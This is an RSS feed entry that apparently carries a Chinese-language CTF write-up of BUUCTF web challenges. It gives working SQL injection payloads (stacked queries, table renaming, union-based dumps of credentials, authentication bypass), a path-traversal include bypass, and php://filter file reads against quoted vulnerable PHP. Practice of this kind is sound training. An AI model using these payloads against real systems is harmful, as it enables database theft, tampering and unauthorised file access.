<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>BUUCTF_Web on Braindance</title><link>https://www.braindance.top/tags/buuctf_web/</link><description>Recent content in BUUCTF_Web on Braindance</description><generator>Hugo -- gohugo.io</generator><language>zh-cn</language><lastBuildDate>Mon, 18 Jan 2021 16:58:56 +0000</lastBuildDate><atom:link href="https://www.braindance.top/tags/buuctf_web/index.xml" rel="self" type="application/rss+xml"/><item><title>BUUCTFå¯’å‡åˆ·é¢˜-Web</title><link>https://www.braindance.top/posts/ctf/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/</link><pubDate>Mon, 18 Jan 2021 16:58:56 +0000</pubDate><guid>https://www.braindance.top/posts/ctf/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/</guid><description>&lt;p&gt;å¯’å‡æ¨ªå‘åˆ·é¢˜ï¼ˆå°½é‡ï¼‰
&lt;a class="link" href="https://buuoj.cn/challenges#" target="_blank" rel="noopener"
&gt;BUUCTF&lt;/a&gt;
ğŸ’—ğŸ§¡ğŸ’›ğŸ’šğŸ’™ğŸ’œğŸ¤ğŸ–¤ğŸ¤
&lt;strong&gt;é¢˜éƒ½å†™è¿™ä¸€ä¸ªé‡Œé¢äº†ï¼Œå¯ä»¥å…ˆç”¨&lt;code&gt;Ctrl+F&lt;/code&gt;æœç´¢ï¼Œè¿˜æœ‰éƒ¨åˆ†æ˜¯è‰ç¨¿è¿˜æ²¡æœ‰æ•´ç†ï¼Œä¸è¿‡æˆ‘è®¤ä¸ºçš„æ€è·¯å·²ç»æ•´ç†å‡ºæ¥äº†ï¼Œçœ‹ä¸æ‡‚è¿˜è¯·å¤§ä¼™è§è°…ã€‚æœ‰é—®é¢˜äº†å¾ˆä¹æ„æ•ˆåŠ³ğŸ’¨&lt;/strong&gt;&lt;/p&gt;
&lt;h1 id="20210115"&gt;2021.01.15
&lt;/h1&gt;&lt;h1 id="hctf-2018warmup"&gt;[HCTF 2018]WarmUp
&lt;/h1&gt;&lt;p&gt;è¿›åˆ°é¶æœºä¸€ä¸ªç¡•å¤§çš„æ»‘ç¨½ï¼ŒæŸ¥çœ‹æºç æœ‰æç¤ºsource.php&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210120101413.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;&amp;lt;?php
highlight_file(__FILE__);
class emmm
{
public static function checkFile(&amp;amp;$page)
{
$whitelist = [&amp;#34;source&amp;#34;=&amp;gt;&amp;#34;source.php&amp;#34;,&amp;#34;hint&amp;#34;=&amp;gt;&amp;#34;hint.php&amp;#34;];
if (! isset($page) || !is_string($page)) {
echo &amp;#34;you can&amp;#39;t see it&amp;#34;;
return false;
}
if (in_array($page, $whitelist)) {
return true;
}
$_page = mb_substr(
$page,
0,
mb_strpos($page . &amp;#39;?&amp;#39;, &amp;#39;?&amp;#39;)
);
if (in_array($_page, $whitelist)) {
return true;
}
$_page = urldecode($page);
$_page = mb_substr(
$_page,
0,
mb_strpos($_page . &amp;#39;?&amp;#39;, &amp;#39;?&amp;#39;)
);
if (in_array($_page, $whitelist)) {
return true;
}
echo &amp;#34;you can&amp;#39;t see it&amp;#34;;
return false;
}
}
if (! empty($_REQUEST[&amp;#39;file&amp;#39;])
&amp;amp;&amp;amp; is_string($_REQUEST[&amp;#39;file&amp;#39;])
&amp;amp;&amp;amp; emmm::checkFile($_REQUEST[&amp;#39;file&amp;#39;])
) {
include $_REQUEST[&amp;#39;file&amp;#39;];
exit;
} else {
echo &amp;#34;&amp;lt;br&amp;gt;&amp;lt;img src=\&amp;#34;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&amp;#34; /&amp;gt;&amp;#34;;
}
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;å‘ç°ç™½åå•æœ‰source.phpå’Œhint.phpï¼Œå…ˆå»æŸ¥çœ‹ä¸€ä¸‹hint.php&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;flag not here, and flag in ffffllllaaaagggg&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;åˆ†ææºç &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;åˆ¤æ–­&lt;code&gt;$_REQUEST['file']&lt;/code&gt;å¯¹è±¡ä¸ºç©ºä¸”ä¸ºå­—ç¬¦ä¸²&lt;/li&gt;
&lt;li&gt;æ‰§è¡Œemmmç±»ä¸­çš„&lt;strong&gt;checkFile&lt;/strong&gt;æ–¹æ³•åˆ¤æ–­æ˜¯å¦åœ¨ç™½åå•ï¼ˆç¡®ä¿å‡½æ•°è¿”å›æ˜¯trueï¼‰&lt;/li&gt;
&lt;li&gt;æ–‡ä»¶åŒ…å«&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;checkFileå‡½æ•°ä¸­å­—ç¬¦ä¸²æˆªå–åˆ¤æ–­æ˜¯å¦åœ¨ç™½åå•ï¼ˆä»£ç 17-24å’Œ26-34ï¼‰æ‰€ä»¥æœ‰ä¸¤ç§ç»•è¿‡æ–¹æ³•ã€‚&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;ç¬¬ä¸€ç§&lt;/li&gt;
&lt;/ol&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;file=hint.php?../../../../../ffffllllaaaagggg
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;å­—ç¬¦ä¸²æˆªå–å°†åŸå­—ç¬¦ä¸²å°¾éƒ¨åŠ ä¸Š&lt;code&gt;?&lt;/code&gt;å†æˆªå–ç¬¬ä¸€ä¸ª&lt;code&gt;?&lt;/code&gt;ä¹‹å‰çš„å†…å®¹ã€‚æ‰€ä»¥éœ€è¦åœ¨æ„é€ payloadæ—¶é—®å·å‰éœ€è¦æ˜¯ç™½åå•é‡Œçš„æ–‡ä»¶ã€‚é—®å·ä¹‹åï¼ŒçŒœæµ‹flagä½ç½®åœ¨æ ¹ç›®å½•ä¸‹ï¼Œæ‰€ä»¥ä½¿ç”¨å°½å¯èƒ½å¤šçš„&lt;code&gt;../&lt;/code&gt;è¿”å›ä¸Šçº§ç›®å½•ã€‚&lt;/p&gt;
&lt;ol start="2"&gt;
&lt;li&gt;ç¬¬äºŒç§&lt;/li&gt;
&lt;/ol&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;hint.php%3F..%2F..%2F..%2F..%2F..%2Fffffllllaaaagggg
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;å°†ç¬¬ä¸€ç§payloadä½¿ç”¨urlencodeç¼–ç å³å¯ã€‚&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id="å¼ºç½‘æ¯-2019éšä¾¿æ³¨"&gt;[å¼ºç½‘æ¯ 2019]éšä¾¿æ³¨
&lt;/h1&gt;&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210120094248.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;æ ¹æ®é¢˜ç›®å°è¯•sqlæ³¨å…¥ï¼Œå•å¼•å·æŠ¥é”™ï¼Œå•å¼•å·åŠ æ³¨é‡Šæ— æŠ¥é”™ï¼Œè¯´æ˜å­˜åœ¨sqlæ³¨å…¥ï¼Œå½“æµ‹è¯•è¾“å…¥selectæ—¶è¿”å›è¿‡æ»¤çš„é»‘åå•ï¼š&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;return preg_match(&amp;#34;/select|update|delete|drop|insert|where|\./i&amp;#34;,$inject);
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;è¿™é“é¢˜ä½¿ç”¨çš„æ˜¯å †å æ³¨å…¥ï¼ŒåŸç†&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;åœ¨SQLä¸­ï¼Œåˆ†å·ï¼ˆ;ï¼‰æ˜¯ç”¨æ¥è¡¨ç¤ºä¸€æ¡sqlè¯­å¥çš„ç»“æŸã€‚è¯•æƒ³ä¸€ä¸‹æˆ‘ä»¬åœ¨ ; ç»“æŸä¸€ä¸ªsqlè¯­å¥åç»§ç»­æ„é€ ä¸‹ä¸€æ¡è¯­å¥ï¼Œä¼šä¸ä¼šä¸€èµ·æ‰§è¡Œï¼Ÿå› æ­¤è¿™ä¸ªæƒ³æ³•ä¹Ÿå°±é€ å°±äº†å †å æ³¨å…¥ã€‚è€Œunion injectionï¼ˆè”åˆæ³¨å…¥ï¼‰ä¹Ÿæ˜¯å°†ä¸¤æ¡è¯­å¥åˆå¹¶åœ¨ä¸€èµ·ï¼Œä¸¤è€…ä¹‹é—´æœ‰ä»€ä¹ˆåŒºåˆ«ä¹ˆï¼ŸåŒºåˆ«å°±åœ¨äºunion æˆ–è€…union allæ‰§è¡Œçš„è¯­å¥ç±»å‹æ˜¯æœ‰é™çš„ï¼Œå¯ä»¥ç”¨æ¥æ‰§è¡ŒæŸ¥è¯¢è¯­å¥ï¼Œè€Œå †å æ³¨å…¥å¯ä»¥æ‰§è¡Œçš„æ˜¯ä»»æ„çš„è¯­å¥ã€‚ä¾‹å¦‚ä»¥ä¸‹è¿™ä¸ªä¾‹å­ã€‚ç”¨æˆ·è¾“å…¥ï¼š1; DELETE FROM productsæœåŠ¡å™¨ç«¯ç”Ÿæˆçš„sqlè¯­å¥ä¸ºï¼šï¼ˆå› æœªå¯¹è¾“å…¥çš„å‚æ•°è¿›è¡Œè¿‡æ»¤ï¼‰Select * from products where productid=1;DELETE FROM productså½“æ‰§è¡ŒæŸ¥è¯¢åï¼Œç¬¬ä¸€æ¡æ˜¾ç¤ºæŸ¥è¯¢ä¿¡æ¯ï¼Œç¬¬äºŒæ¡åˆ™å°†æ•´ä¸ªè¡¨è¿›è¡Œåˆ é™¤ã€‚&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;æŸ¥çœ‹æ•°æ®åº“&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;1&amp;#39;;show databases;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210120095211.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;æŸ¥çœ‹å½“å‰åº“ä¸‹çš„è¡¨&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;1&amp;#39;;show tables;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210120095339.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;æŸ¥çœ‹ä¸¤å¼ è¡¨å­—æ®µ&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;1&amp;#39;;show columns from words;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210120095607.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;è¿˜æœ‰ä¸€ç§æŸ¥çœ‹è¡¨çš„è¯­å¥ï¼Œåœ¨windowsç³»ç»Ÿä¸‹ï¼Œåå•å¼•å·ï¼ˆ`ï¼‰æ˜¯æ•°æ®åº“ã€è¡¨ã€ç´¢å¼•ã€åˆ—å’Œåˆ«åç”¨çš„å¼•ç”¨ç¬¦&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;1&amp;#39;;desc `1919810931114514`;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210120095839.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;æ‰¾åˆ°äº†flagåœ¨çš„å­—æ®µï¼Œæ¥ä¸‹æ¥å°±æ˜¯å¦‚ä½•è·å–è¯¥å­—æ®µçš„å€¼ã€‚é¡ºå¸¦ä¸€æï¼Œæ ¹æ®è¡¨çš„ç»“æ„ï¼Œåˆæ­¥åˆ¤æ–­é»˜è®¤æŸ¥è¯¢çš„æ˜¯&lt;strong&gt;word&lt;/strong&gt;è¡¨ä¸­çš„å­—æ®µï¼Œè€Œflagåœ¨&lt;strong&gt;1919810931114514&lt;/strong&gt;è¡¨ä¸­ã€‚&lt;/p&gt;
&lt;p&gt;ç½‘ä¸Šæ‰¾åˆ°çš„ä¸¤ç§æ–¹æ³•ï¼Œåˆ†åˆ«æ˜¯ä¿®æ”¹è¡¨åå’Œä½¿ç”¨é¢„å¤„ç†è¯­å¥ã€‚&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;ä½¿ç”¨&lt;a class="link" href="https://www.cnblogs.com/geaozhang/p/9891338.html" target="_blank" rel="noopener"
&gt;é¢„å¤„ç†&lt;/a&gt;è¯­å¥&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;å› ä¸ºselectè¢«è¿‡æ»¤äº†ï¼Œä½†æ˜¯å¯ä»¥ä½¿ç”¨charå‡½æ•°ï¼Œchar() å‡½æ•°å°†selectçš„ASCIIç è½¬æ¢ä¸ºselectå­—ç¬¦ä¸²ï¼Œæ¥ç€åˆ©ç”¨concat()å‡½æ•°è¿›è¡Œæ‹¼æ¥å¾—åˆ°selectæŸ¥è¯¢è¯­å¥ï¼Œä»è€Œç»•è¿‡è¿‡æ»¤ã€‚æˆ–è€…ç›´æ¥ç”¨concat()å‡½æ•°æ‹¼æ¥selectæ¥ç»•è¿‡ã€‚&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;char(115,101,108,101,99,116)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;æ ¹æ®é¢„å¤„ç†è¯­å¥æ ¼å¼æ„é€ payload&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;åˆ›å»ºä¸€ä¸ª&lt;strong&gt;sqli&lt;/strong&gt;å­—ç¬¦ä¸²å€¼ä¸ºæŸ¥è¯¢sqlè¯­å¥ï¼Œä½¿ç”¨é¢„å¤„ç†è¯­å¥èµ‹å€¼å¹¶æ‰§è¡Œã€‚&lt;/li&gt;
&lt;/ul&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;1&amp;#39;;SET @sqli=concat(char(115,101,108,101,99,116),&amp;#39;* from `1919810931114514`&amp;#39;);PREPARE hacker from @sqli;EXECUTE hacker;#
&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;
&lt;li&gt;ä¸ä½¿ç”¨å˜é‡&lt;/li&gt;
&lt;/ul&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;1&amp;#39;;PREPARE sqli FROM CONCAT(&amp;#39;s&amp;#39;,&amp;#39;elect&amp;#39;,&amp;#39; * from `1919810931114514`&amp;#39;);EXECUTE sqli; #
&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;
&lt;li&gt;è¿˜æœ‰ä¸€ç§&lt;/li&gt;
&lt;/ul&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;1&amp;#39;;SET @sqli = CONCAT(&amp;#39;s&amp;#39;,&amp;#39;e&amp;#39;,&amp;#39;l&amp;#39;,&amp;#39;e&amp;#39;,&amp;#39;c&amp;#39;,&amp;#39;t&amp;#39;,&amp;#39; * from `1919810931114514`&amp;#39;);PREPARE haha FROM@sqli ;EXECUTE haha; #
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;ä¸»è¦åŒºåˆ«åœ¨äºè¿‡æ»¤çš„ç»•è¿‡æ–¹å¼ï¼Œä¸è¦æ‹˜æ³¥äºä¸€ç§æ–¹å¼ã€‚&lt;/p&gt;
&lt;ol start="2"&gt;
&lt;li&gt;ä¿®æ”¹è¡¨å&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;ä¿®æ”¹è¡¨åçš„æ€è·¯æ˜¯ï¼šé»˜è®¤æŸ¥è¯¢çš„æ˜¯&lt;strong&gt;word&lt;/strong&gt;è¡¨ç¬¬ä¸€ä¸ªå­—æ®µï¼Œæ‰€ä»¥æŠŠ&lt;strong&gt;word&lt;/strong&gt;è¡¨ä¿®æ”¹ä¸ºå…¶ä»–åç§°ï¼Œå°†flagæ‰€åœ¨çš„&lt;strong&gt;1919810931114514&lt;/strong&gt;è¡¨åä¿®æ”¹ä¸º&lt;strong&gt;word&lt;/strong&gt;ã€‚&lt;/p&gt;
&lt;p&gt;ç½‘ä¸Špayload&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;0&amp;#39;;rename table words to words1;rename table `1919810931114514` to words;alter table words change flag id varchar(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL;desc words;#
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;è‡ªå·±æ„é€ çš„payload&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;0&amp;#39;;rename table words to words1;rename table `1919810931114514` to words;alter table words change flag id varchar(100) #
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;ä¹‹åæ‰§è¡Œ&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;1&amp;#39; or 1=1 #
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;æŸ¥è¯¢è¡¨æ‰€æœ‰å­—æ®µå€¼å³å¯ã€‚&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id="æå®¢å¤§æŒ‘æˆ˜-2019easysql"&gt;[æå®¢å¤§æŒ‘æˆ˜ 2019]EasySQL
&lt;/h1&gt;&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210120101528.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;ç”¨æˆ·åå¯†ç ï¼Œå°è¯•ä¸‡èƒ½å¯†ç ã€‚&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;&amp;#39;or 1=1 #
éšä¾¿å¯†ç 
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;ä¸€ä¸ªä¸‡èƒ½å¯†ç çš„å‚è€ƒ:https://www.cnblogs.com/pass-A/p/11134988.html&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id="æå®¢å¤§æŒ‘æˆ˜-2019havefun"&gt;[æå®¢å¤§æŒ‘æˆ˜ 2019]Havefun
&lt;/h1&gt;&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210120101733.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;ç›´æ¥æºç æ‰¾åˆ°phpä»£ç ã€‚payload&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;?cat=dog
&lt;/code&gt;&lt;/pre&gt;&lt;hr&gt;
&lt;h1 id="suctf-2019easysql"&gt;[SUCTF 2019]EasySQL
&lt;/h1&gt;&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210120102317.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;å•å¼•å·æ— æŠ¥é”™ï¼Œå°è¯•å †å æ³¨å…¥å¯ä»¥å›æ˜¾ã€‚&lt;/p&gt;
&lt;p&gt;å’Œ [å¼ºç½‘æ¯ 2019]éšä¾¿æ³¨è¿™é“é¢˜ä¸€æ ·æŸ¥åº“æŸ¥è¡¨æŸ¥å­—æ®µ&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;1;show databases;
1;show tables;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;ä½†æ˜¯æ‰§è¡Œ&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;1;desc `Flag`;
1;show columns from Flag;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;è¿”å›äº†&amp;quot;Nonono.â€œæµ‹è¯•å‡ºè¢«è¿‡æ»¤äº†ï¼šdescã€fromã€Flagã€‚&lt;/p&gt;
&lt;p&gt;æ¥ä¸‹æ¥çš„éƒ½æ˜¯æŠ„ç½‘ä¸Šçš„é¢„æœŸè§£ä¹Ÿæ˜¯ç¬¬ä¸€æ¬¡è§ã€‚&lt;/p&gt;
&lt;p&gt;æ¯”èµ›æ—¶æºç æ³„éœ²&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;select $_GET[&amp;#39;query&amp;#39;] || flag from flag
&lt;/code&gt;&lt;/pre&gt;&lt;blockquote&gt;
&lt;p&gt;åœ¨oracle ç¼ºçœæ”¯æŒ é€šè¿‡ â€˜ || â€™ æ¥å®ç°å­—ç¬¦ä¸²æ‹¼æ¥ï¼Œä½†åœ¨mysql ç¼ºçœä¸æ”¯æŒã€‚éœ€è¦è°ƒæ•´mysql çš„sql_mode
æ¨¡å¼ï¼špipes_as_concat æ¥å®ç°oracle çš„ä¸€äº›åŠŸèƒ½&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;payload&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;1;set sql_mode=PIPES_AS_CONCAT;select 1
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;éé¢„æœŸè§£&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;*,1
&lt;/code&gt;&lt;/pre&gt;&lt;hr&gt;
&lt;h1 id="actf2020-æ–°ç”Ÿèµ›include"&gt;[ACTF2020 æ–°ç”Ÿèµ›]Include
&lt;/h1&gt;&lt;p&gt;ä¸æˆªå›¾äº†ï¼Œè¿›å…¥é¶æœºåªæœ‰ä¸€ä¸ª&lt;strong&gt;tips&lt;/strong&gt;ç­‰ç€è¢«ç‚¹ã€‚è·³è½¬ä»¥åçœ‹urlä¸­å‚æ•°&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;?file=flag.php
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;é¡µé¢å†…å®¹åªæœ‰&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Can you find out the flag?&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;ç«‹é©¬æƒ³åˆ°ä½¿ç”¨phpä¼ªåè®®è¯»æ–‡ä»¶å†…å®¹ã€‚ä½¿ç”¨filterè¿‡æ»¤å™¨&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;?file=php://filter/convert.base64-encode/resource=flag.php
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;å¾—åˆ°&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;PD9waHAKZWNobyAiQ2FuIHlvdSBmaW5kIG91dCB0aGUgZmxhZz8iOwovL2ZsYWd7OTAyNTIyNDgtMjY3NC00NDdjLWFlYWMtYjc3ZTc5YjYwMzVmfQo=
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;è§£å¯†å¾—åˆ°flag&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id="æå®¢å¤§æŒ‘æˆ˜-2019secret-file"&gt;[æå®¢å¤§æŒ‘æˆ˜ 2019]Secret File
&lt;/h1&gt;&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210120103724.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;æŸ¥çœ‹æºç ï¼Œåˆä¸€ä¸ªèƒŒæ™¯æ˜¯é»‘è‰²çš„è¶…é“¾æ¥è·³è½¬åˆ° Archive_room.phpã€‚&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210120103842.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;æŸ¥çœ‹æºç SECRETè·³è½¬çš„æ˜¯action.phpã€‚&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210120103907.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;ä½†æ˜¯è·³è½¬ä»¥åæ˜¯urlåœ°å€ä¸ºend.phpï¼Œæ‰€ä»¥ä¸­é—´è·³è¿‡äº†ä¸€ä¸ªé¡µé¢ï¼Œä½¿ç”¨bpæŠ“åŒ…æŸ¥çœ‹ã€‚&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210120104246.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;stristr()å‡½æ•°è¿”å›å­—ç¬¦ä¸²ä¸­å­ä¸²ç¬¬ä¸€æ¬¡å‡ºç°ä½ç½®ä¹‹åçš„å†…å®¹ï¼Œç®€è€Œè¨€ä¹‹è¿˜æ˜¯è¿‡æ»¤ã€‚&lt;/p&gt;
&lt;p&gt;åŒæ ·ä½¿ç”¨phpä¼ªåè®®filterè¿‡æ»¤å™¨è¯»å–æ–‡ä»¶&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;?file=php://filter/convert.base64-encode/resource=flag.php
&lt;/code&gt;&lt;/pre&gt;&lt;pre tabindex="0"&gt;&lt;code&gt;PCFET0NUWVBFIGh0bWw+Cgo8aHRtbD4KCiAgICA8aGVhZD4KICAgICAgICA8bWV0YSBjaGFyc2V0PSJ1dGYtOCI+CiAgICAgICAgPHRpdGxlPkZMQUc8L3RpdGxlPgogICAgPC9oZWFkPgoKICAgIDxib2R5IHN0eWxlPSJiYWNrZ3JvdW5kLWNvbG9yOmJsYWNrOyI+PGJyPjxicj48YnI+PGJyPjxicj48YnI+CiAgICAgICAgCiAgICAgICAgPGgxIHN0eWxlPSJmb250LWZhbWlseTp2ZXJkYW5hO2NvbG9yOnJlZDt0ZXh0LWFsaWduOmNlbnRlcjsiPuWViuWTiO+8geS9oOaJvuWIsOaIkeS6hu+8geWPr+aYr+S9oOeci+S4jeWIsOaIkVFBUX5+fjwvaDE+PGJyPjxicj48YnI+CiAgICAgICAgCiAgICAgICAgPHAgc3R5bGU9ImZvbnQtZmFtaWx5OmFyaWFsO2NvbG9yOnJlZDtmb250LXNpemU6MjBweDt0ZXh0LWFsaWduOmNlbnRlcjsiPgogICAgICAgICAgICA8P3BocAogICAgICAgICAgICAgICAgZWNobyAi5oiR5bCx5Zyo6L+Z6YeMIjsKICAgICAgICAgICAgICAgICRmbGFnID0gJ2ZsYWd7ZmZjZTAwNWYtYjEyOS00YWM1LTg3MzYtZDM3YzUwYjYxNjZkfSc7CiAgICAgICAgICAgICAgICAkc2VjcmV0ID0gJ2ppQW5nX0x1eXVhbl93NG50c19hX2cxcklmcmkzbmQnCiAgICAgICAgICAgID8+CiAgICAgICAgPC9wPgogICAgPC9ib2R5PgoKPC9odG1sPgo=
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;è§£å¯†å¾—åˆ°ç½‘é¡µæºç ï¼Œflagåœ¨å…¶ä¸­ã€‚&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id="æå®¢å¤§æŒ‘æˆ˜-2019lovesql"&gt;[æå®¢å¤§æŒ‘æˆ˜ 2019]LoveSQL
&lt;/h1&gt;&lt;p&gt;é¡¶ç«¯ã®å‘Šè¯«ï¼šç”¨ sqlmap æ˜¯æ²¡æœ‰çµé­‚çš„&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210120104703.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;å°è¯•ä¸‡èƒ½å¯†ç ï¼ˆå…¶å®æ²¡åµç”¨ï¼‰&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;&amp;#39;or 1=1 #
ä»»æ„å¯†ç 
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;è¿™é“é¢˜æ˜¯å¸¸è§„çš„sqlæ³¨å…¥ï¼Œæµ‹æ³¨å…¥ç‚¹ã€æŸ¥å­—æ®µæ•°ã€çˆ†åº“ã€çˆ†å­—æ®µå€¼ã€çˆ†è¡¨ã€‚ç»„åˆæ‹³&lt;/p&gt;
&lt;p&gt;å­—æ®µæ•°ï¼š&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;1&amp;#39; order by 3 #
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;çˆ†åº“ï¼š&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;1&amp;#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() #
geekuser,l0ve1ysq1
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;çˆ†å­—æ®µå€¼ï¼š&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;1&amp;#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&amp;#39;l0ve1ysq1&amp;#39; #
id,username,password
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;çˆ†è¡¨ï¼š&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;1&amp;#39; union select 1,2,group_concat(id,username,password) from l0ve1ysq1 #
&amp;#39;1cl4ywo_tai_nan_le,2glzjinglzjin_wants_a_girlfriend,3Z4cHAr7zCrbiao_ge_dddd_hm,40xC4m3llinux_chuang_shi_ren,5Ayraina_rua_rain,6Akkoyan_shi_fu_de_mao_bo_he,7fouc5cl4y,8fouc5di_2_kuai_fu_ji,9fouc5di_3_kuai_fu_ji,10fouc5di_4_kuai_fu_ji,11fouc5di_5_kuai_fu_ji,12fouc5di_6_kuai_fu_ji,13fouc5di_7_kuai_fu_ji,14fouc5di_8_kuai_fu_ji,15leixiaoSyc_san_da_hacker,16flagflag{c4e8849c-e0e3-4e0d-b701-26a5abeec46a}&amp;#39;
&lt;/code&gt;&lt;/pre&gt;&lt;hr&gt;
&lt;h1 id="20210121"&gt;2021.01.21
